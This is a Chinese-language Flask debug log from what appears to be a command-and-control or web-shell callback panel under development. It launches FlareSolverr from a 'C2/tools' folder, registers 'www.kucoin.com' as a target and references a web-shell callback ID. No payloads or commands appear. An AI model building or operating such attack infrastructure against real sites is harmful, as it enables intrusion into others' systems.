2025-06-24 14:57:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:57:34] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:58:27 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:58:27 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:58:27 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:58:27 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:58:27 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:58:27 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:58:27 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:58:27 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:58:27 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 14:58:31 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 14:58:31 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 14:58:31 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:58:31 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:58:31 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:58:31 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:58:31 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:58:31 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:58:31 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:58:31 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:58:31 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:58:31 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:58:31 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 14:58:31 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:58:31 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:58:31 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 14:58:31 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 14:58:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:58:31 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:58:31 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.005s)
2025-06-24 14:58:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:31] "GET /add_target HTTP/1.1" 200 -
2025-06-24 14:58:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:58:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:58:33 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:58:33 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 14:58:33 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 14:58:33 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.024s)
2025-06-24 14:58:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:33] "GET / HTTP/1.1" 200 -
2025-06-24 14:58:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:58:36 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:58:36 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.000s)
2025-06-24 14:58:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:36] "GET /add_target HTTP/1.1" 200 -
2025-06-24 14:58:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:36] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:58:39 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:58:39 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.kucoin.com', target_ip='https://www.etsy.com/'
2025-06-24 14:58:39 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:58:39 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:58:39 | INFO     | index_routes.py:82 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-24 14:58:39 | INFO     | index_routes.py:82 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-24 14:58:39 | INFO     | index_routes.py:83 | add_target() | 目標添加成功: ID=1
2025-06-24 14:58:39 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.005s)
2025-06-24 14:58:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:39] "[32mPOST /add_target HTTP/1.1[0m" 302 -
2025-06-24 14:58:39 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:58:39 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 14:58:39 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-24 14:58:39 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-24 14:58:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:39] "GET / HTTP/1.1" 200 -
2025-06-24 14:58:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:58:39] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:04:08 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:04:08 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:04:08 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:04:08 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:04:08 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:04:08 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:04:08 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:04:08 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:04:08 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:04:12 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 15:04:12 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 15:04:12 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:04:12 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:04:12 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:04:12 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:04:12 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:04:12 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:04:12 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:04:12 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:04:12 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:04:12 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:04:12 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 15:04:12 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:04:12 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:04:12 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 15:04:12 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 15:13:07 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:13:07 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:13:07 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:13:07 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:13:07 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:13:07 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:13:07 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:13:07 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:13:07 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:13:11 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 15:13:11 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 15:13:11 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:13:11 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:13:11 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 15:13:11 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 15:20:00 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:20:00 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 15:20:00 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 15:20:00 | ERROR    | config.py:218 | wrapper() | ❌ 函數 index 執行失敗 (耗時: 0.030s): Could not build url for endpoint 'control.control_message'. Did you mean 'control.get_messages' instead?
2025-06-24 15:20:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:20:00] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-06-24 15:20:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:20:00] "GET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
2025-06-24 15:20:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:20:00] "GET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
2025-06-24 15:20:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:20:00] "GET /?__debugger__=yes&cmd=resource&f=console.png&s=aWFFxDRr8ubXXn2yNplt HTTP/1.1" 200 -
2025-06-24 15:20:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:20:00] "GET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
2025-06-24 15:21:35 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:21:35 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 15:21:35 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 15:21:35 | ERROR    | config.py:218 | wrapper() | ❌ 函數 index 執行失敗 (耗時: 0.004s): Could not build url for endpoint 'control.get_messages'. Did you forget to specify values ['web_shell_back_point_id']?
2025-06-24 15:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:21:35] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-06-24 15:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:21:35] "[36mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 304 -
2025-06-24 15:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:21:35] "[36mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 304 -
2025-06-24 15:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:21:35] "[36mGET /?__debugger__=yes&cmd=resource&f=console.png&s=aWFFxDRr8ubXXn2yNplt HTTP/1.1[0m" 304 -
2025-06-24 15:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:21:35] "[36mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 304 -
2025-06-24 15:22:42 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:22:42 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 15:22:42 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 15:22:42 | ERROR    | config.py:218 | wrapper() | ❌ 函數 index 執行失敗 (耗時: 0.001s): Could not build url for endpoint 'control.get_messages'. Did you forget to specify values ['web_shell_back_point_id']?
2025-06-24 15:22:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:22:42] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-06-24 15:22:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:22:42] "[36mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 304 -
2025-06-24 15:22:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:22:42] "[36mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 304 -
2025-06-24 15:22:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:22:42] "[36mGET /?__debugger__=yes&cmd=resource&f=console.png&s=aWFFxDRr8ubXXn2yNplt HTTP/1.1[0m" 304 -
2025-06-24 15:22:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:22:42] "[36mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 304 -
2025-06-24 15:23:06 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:23:06 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:23:06 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:23:06 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:23:06 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:23:06 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:23:06 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:23:06 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:23:06 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:23:10 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 15:23:10 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 15:23:10 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:23:10 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:23:10 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 15:23:10 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 15:23:10 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:23:10 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 15:23:10 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 15:23:10 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.027s)
2025-06-24 15:23:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:10] "GET / HTTP/1.1" 200 -
2025-06-24 15:23:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:10] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:23:13 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:23:13 | INFO     | control_route.py:38 | get_messages() | 用戶請求獲取消息
2025-06-24 15:23:13 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.001s)
2025-06-24 15:23:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:13] "[33mGET /api/control/get_messages HTTP/1.1[0m" 404 -
2025-06-24 15:23:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:13] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:23:42 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:23:42 | INFO     | control_route.py:38 | get_messages() | 用戶請求獲取消息
2025-06-24 15:23:42 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.001s)
2025-06-24 15:23:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:42] "[33mGET /api/control/get_messages HTTP/1.1[0m" 404 -
2025-06-24 15:23:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:42] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:23:43 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:23:43 | INFO     | control_route.py:38 | get_messages() | 用戶請求獲取消息
2025-06-24 15:23:43 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.001s)
2025-06-24 15:23:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:43] "[33mGET /api/control/get_messages HTTP/1.1[0m" 404 -
2025-06-24 15:23:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:23:43] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:24:38 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:24:38 | INFO     | control_route.py:38 | get_messages() | 用戶請求獲取消息
2025-06-24 15:24:38 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.001s)
2025-06-24 15:24:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:24:38] "[33mGET /api/control/get_messages HTTP/1.1[0m" 404 -
2025-06-24 15:24:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:24:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:24:45 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:24:45 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:24:45 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:24:45 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:24:45 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:24:45 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:24:45 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:24:45 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:24:45 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:24:49 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 15:24:49 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 15:24:49 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:24:49 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:24:49 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 15:24:49 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 15:24:50 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:24:50 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 15:24:50 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.026s)
2025-06-24 15:24:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:24:50] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 15:24:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:24:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:28:20 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:28:20 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 15:28:20 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.003s)
2025-06-24 15:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:28:20] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 15:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:28:20] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:28:20 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:28:20 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 15:28:20 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.001s)
2025-06-24 15:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:28:20] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 15:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:28:20] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:28:32 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:28:32 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:28:32 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:28:32 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:28:32 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:28:32 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:28:32 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:28:32 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:28:32 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:28:41 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:28:41 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:28:41 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:28:41 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:28:41 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:28:41 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:28:41 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:28:41 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:28:41 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:28:45 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 15:28:45 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 15:28:45 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:28:45 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:28:45 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 15:28:45 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 15:28:45 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:28:45 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 15:28:45 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.024s)
2025-06-24 15:28:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:28:45] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 15:28:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:28:46] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:29:02 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 15:29:02 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 15:29:02 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.003s)
2025-06-24 15:29:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:29:02] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 15:29:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:29:02] "GET /static/css/control_message.css HTTP/1.1" 200 -
